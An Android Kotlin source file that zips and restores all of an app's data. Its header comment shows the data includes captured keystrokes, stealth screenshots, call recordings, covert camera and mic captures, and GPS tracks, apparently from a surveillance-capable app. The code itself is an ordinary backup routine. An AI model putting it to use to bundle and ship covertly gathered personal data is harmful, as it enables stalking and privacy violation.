package com.ismartcoding.plain.helpers

import android.content.Context
import com.ismartcoding.lib.logcat.LogCat
import com.ismartcoding.plain.MainApp
import java.io.File
import java.io.FileOutputStream
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import java.util.zip.ZipEntry
import java.util.zip.ZipOutputStream

/**
 * PlainApp complete backup / restore engine.
 *
 * Output format: `.plain`  (a ZIP archive internally — renamed extension so file managers
 * do not auto-open it and leak private data).  Rename to `.zip` on a PC to browse contents.
 *
 * ┌─────────────────────────────────────────────────────────────────────────────────────────┐
 * │  What is included (everything that would be LOST on uninstall)                          │
 * ├───────────────────────┬─────────────────────────────────────────────────────────────────┤
 * │ databases/            │ Room database (plain.db + WAL):                                 │
 * │                       │   notes, bookmarks, feeds, feed-entries, books, book-chapters,  │
 * │                       │   chats, chat-channels, archived-conversations, tags,            │
 * │                       │   tag-relations, sessions, pomodoro-items, peers, files         │
 * ├───────────────────────┼─────────────────────────────────────────────────────────────────┤
 * │ files/                │ App internal storage (filesDir):                                │
 * │   datastore/          │   Every DataStore preference: web password, PIN, Telegram       │
 * │                       │   token, all feature toggles, Cloudflare token/hostname, …      │
 * │   .PlainPrivate/      │   Private hidden directory:                                     │
 * │     StealthShots/     │     Stealth screenshot images + metadata JSON sidecars           │
 * │     CallRecordings/   │     Recorded call audio (.m4a) + JSON sidecar per call          │
 * │     IntruderCaptures/ │     Wrong-unlock selfie photos + metadata JSON                  │
 * │     LiveCaptures/     │     Live-camera photos/videos, mic recordings + sidecars        │
 * │     GeofenceAudio/    │     Geofence trigger audio clips                                │
 * │   keystore.bks        │   HTTPS/SSL certificate for the web console                    │
 * │   cloudflared/        │   cloudflared runtime logs (binary excluded; re-extracted)      │
 * │   crash_log.txt       │   App crash reports                                             │
 * ├───────────────────────┼─────────────────────────────────────────────────────────────────┤
 * │ shared_prefs/         │ All SharedPreferences XML files:                                │
 * │                       │   plain_keystroke_log       — every captured keystroke entry    │
 * │                       │   plain_location_tracking   — all GPS location points           │
 * │                       │   plain_stealth_screenshot  — stealth-shot settings + index     │
 * │                       │   plain_intruder_capture    — intruder settings + index          │
 * │                       │   plain_geofencing          — geofence zones + event log        │
 * │                       │   plain_app_block           — bedtime / app-block config        │
 * │                       │   plain_battery_history     — battery event history             │
 * │                       │   plain_automation          — automation rules                  │
 * │                       │   plain_packet_capture      — packet capture settings           │
 * │                       │   … every other SharedPrefs file PlainApp creates               │
 * ├───────────────────────┼─────────────────────────────────────────────────────────────────┤
 * │ external/             │ External app-specific storage (getExternalFilesDir):            │
 * │                       │   note-images/        — images embedded in notes               │
 * │                       │   feeds/<id>/         — feed article images (offline reading)  │
 * │                       │   bookmark_favicons/  — saved site favicons                    │
 * └───────────────────────┴─────────────────────────────────────────────────────────────────┘
 *
 * What is excluded (regeneratable / not private data)
 * ────────────────────────────────────────────────────
 *   filesDir/image_cache/                  — thumbnail cache, rebuilt on demand
 *   filesDir/upload_tmp/                   — stale upload chunks
 *   filesDir/cloudflared/cloudflared       — native binary, re-extracted from APK at runtime
 */
object BackupManager {

    const val FILE_EXTENSION = "plain"

    private val SKIP_DIR_NAMES  = setOf("image_cache", "upload_tmp")
    private val SKIP_FILE_NAMES = setOf("cloudflared")

    fun buildFileName(): String {
        val ts = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(Date())
        return "plainapp_backup_$ts.$FILE_EXTENSION"
    }

    /**
     * Write the complete backup into the already-opened [out] ZipOutputStream.
     * Caller is responsible for opening and closing the stream.
     */
    fun writeBackup(out: ZipOutputStream, context: Context = MainApp.instance) {
        val extDir = context.getExternalFilesDir(null)
        val targets: List<Pair<String, File>> = buildList {
            add("databases/"    to File(context.dataDir.path + "/databases"))
            add("files/"        to context.filesDir)
            add("shared_prefs/" to File(context.dataDir.path + "/shared_prefs"))
            if (extDir != null) add("external/" to extDir)
        }
        for ((prefix, dir) in targets) {
            if (!dir.exists()) continue
            addDirToZip(out, dir, prefix)
        }
    }

    /**
     * Build the backup to a temp file in [context].cacheDir and return it.
     * Caller is responsible for deleting the file when done.
     */
    fun buildToTemp(context: Context = MainApp.instance): File {
        val tmp = File(context.cacheDir, "plainapp_backup_tg.$FILE_EXTENSION")
        ZipOutputStream(FileOutputStream(tmp)).use { writeBackup(it, context) }
        return tmp
    }

    /**
     * Restore from an already-unzipped [zipRoot] directory into the live app data dirs.
     */
    fun restoreFrom(zipRoot: File, context: Context = MainApp.instance) {
        File(zipRoot, "databases").takeIf { it.exists() }
            ?.copyRecursively(File(context.dataDir.path + "/databases"), overwrite = true)
        File(zipRoot, "files").takeIf { it.exists() }
            ?.copyRecursively(context.filesDir, overwrite = true)
        File(zipRoot, "shared_prefs").takeIf { it.exists() }
            ?.copyRecursively(File(context.dataDir.path + "/shared_prefs"), overwrite = true)
        val extDir = context.getExternalFilesDir(null)
        if (extDir != null) {
            File(zipRoot, "external").takeIf { it.exists() }
                ?.copyRecursively(extDir, overwrite = true)
        }
    }

    // ─── restore stats ────────────────────────────────────────────────────────

    data class RestoreStats(
        val databaseFiles: Int,
        val stealthShots: Int,
        val callRecordings: Int,
        val intruderCaptures: Int,
        val liveCaptures: Int,
        val geofenceAudio: Int,
        val datastoreFiles: Int,
        val sharedPrefsFiles: Int,
        val noteImages: Int,
        val feedImages: Int,
        val bookmarkFavicons: Int,
        val totalFiles: Int,
    )

    /**
     * Count items per category in an already-unzipped backup directory.
     * Call before [restoreFrom] so you can display stats before overwriting data.
     */
    fun scanStats(zipRoot: File): RestoreStats {
        fun countFiles(dir: File): Int =
            if (!dir.exists()) 0
            else dir.walkTopDown().filter { it.isFile }.count()

        fun countExt(dir: File, ext: String): Int =
            if (!dir.exists()) 0
            else dir.walkTopDown().filter { it.isFile && it.extension.lowercase() == ext }.count()

        val privatePath = File(File(zipRoot, "files"), ".PlainPrivate")
        val externalPath = File(zipRoot, "external")

        return RestoreStats(
            databaseFiles    = countFiles(File(zipRoot, "databases")),
            stealthShots     = countExt(File(privatePath, "StealthShots"),     "jpg"),
            callRecordings   = countExt(File(privatePath, "CallRecordings"),   "m4a"),
            intruderCaptures = countExt(File(privatePath, "IntruderCaptures"), "jpg"),
            liveCaptures     = countFiles(File(privatePath, "LiveCaptures")),
            geofenceAudio    = countFiles(File(privatePath, "GeofenceAudio")),
            datastoreFiles   = countFiles(File(File(zipRoot, "files"), "datastore")),
            sharedPrefsFiles = countFiles(File(zipRoot, "shared_prefs")),
            noteImages       = countFiles(File(externalPath, "note-images")),
            feedImages       = countFiles(File(externalPath, "feeds")),
            bookmarkFavicons = countFiles(File(externalPath, "bookmark_favicons")),
            totalFiles       = zipRoot.walkTopDown().filter { it.isFile }.count(),
        )
    }

    private fun addDirToZip(out: ZipOutputStream, dir: File, entryPrefix: String) {
        val children = dir.listFiles() ?: return
        for (child in children) {
            when {
                child.isDirectory -> {
                    if (child.name in SKIP_DIR_NAMES) continue
                    addDirToZip(out, child, entryPrefix + child.name + "/")
                }
                child.isFile -> {
                    if (child.name in SKIP_FILE_NAMES) continue
                    addFileToZip(out, child, entryPrefix + child.name)
                }
            }
        }
    }

    private fun addFileToZip(out: ZipOutputStream, file: File, entryName: String) {
        try {
            out.putNextEntry(ZipEntry(entryName).also { it.time = file.lastModified() })
            file.inputStream().buffered().use { it.copyTo(out) }
            out.closeEntry()
        } catch (e: Exception) {
            LogCat.w("Backup: skipping ${file.path}: ${e.message}")
        }
    }
}
